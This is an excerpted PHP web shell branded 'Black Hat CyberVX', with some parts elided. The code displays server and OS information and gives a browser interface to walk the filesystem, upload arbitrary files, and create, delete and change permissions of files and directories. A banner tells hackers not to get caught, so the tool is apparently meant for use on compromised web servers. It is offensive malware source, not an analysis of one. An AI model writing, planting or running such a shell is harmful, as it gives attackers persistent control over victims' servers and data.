...
echo '
<body>
<h1> <center> <p align="center"> <b>
<font face="Times New Roman" color="orange" size="9"> Black Hat </font>
<font face="Times New Roman" color="red" size="9"> CyberVX </font> <br>
<font face="Times New Roman" color="white" size="5"> Be very careful hackers and crackers not to be discovered, and for script kiddies, try not to do shit !!! </font>
</center> </p> </b>
</h1>

<tr> <td>
<font color="#00ff00"> <center>'.php_uname().'<br> </a> </center> </font> <br>';
...
foreach($paths as $id=>$pat)
{
  if($pat == '' && $id == 0)
  {
    ...
    echo '<font color="#00ff00"> <center> $rooted ->> : <a href="?path=/">/</a>';
    continue;
  }
...
echo ' </font> </center> </td> </tr> <tr> <td> <br> <center>';

if(isset($_FILES['file']))
{
  if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name']))
  {
    echo '<font color="00ff99">File Uploaded</font><br />';
  }
...
<form enctype="multipart/form-data" method="POST"> <font color="black">
...
elseif(isset($_GET['option']) && $_GET['opt'] != 'delete')
{
  ...
  if($_GET['opt'] == 'chmod')
  {
    ...
    echo '
    <form method="POST"> Permission :
      <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($patc)), -4).'" />
  ...
  elseif($_GET['opt'] == 'btw')
  {
    ...
    echo '
    <form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
  ...
  elseif($_GET['opt'] == 'baru')
  {
    ...
    echo '
    <form method="POST">
      Name : <input name="ngaran1" type="text" size="20" value="'.$new.'" />
      <input type="submit" name="ngaran" value="Create"/>
    </form><br> ';
...
else
{
  ...
  <tr>
    <th class=th_home style="background:silver;color:black;"> <center> File Name </center> </th>
    <th class=th_home style="background:silver;color:black;"> <center> Size </center> </th>
    <th class=th_home style="background:silver;color:black;"> <center> Permissions </center> </th>
    <th class=th_home style="background:silver;color:black;"> <center> Settings </center> </th>
  </tr>

  <tr>
    <td class=td_home>Back </td>
    <td class=td_home align=center> NONE </td>
    <td class=td_home align=center> LINK </td>

    <td class=td_home align=center>
      <a href="?option&path='.$pa.'&opt=baru&name=new.php">Add New File</a> | <a href="?option&path='.$pa.'&opt=btw&type=dir"> Add New Dir </a>
    </td>
  </tr>';
  ...
  foreach($scandir as $dir)
  {
    ...
    <a href=\"?option&path=$path&opt=delete&type=dir&name=$dir\">Delete</a> <a href=\"?option&path=$path&opt=chmod&type=dir&name=$dir\">Chmod</a>
    </center></td>
    </tr>";
  }
...
function botao()
{
  window.open("https://pastebin.com/u/CyberVX");
}
</script>
...
<h1> <center> <p align="center"> <b>
  <font face="Times New Roman" color="orange" size="9"> Black Hat </font>
  <font face="Times New Roman" color="red" size="9"> CyberVX </font> <br>
  <font face="Times New Roman" color="blue" size="9"> Server Information </font> <br>
  </center> </p> </b>
</h1>

<font color="red"> <center> <?php info() ?> <br> </a> </center> </font> <br>
<button class="button" onclick="botao()" style="vertical-align:middle"> <span> CyberVX </span> </button>
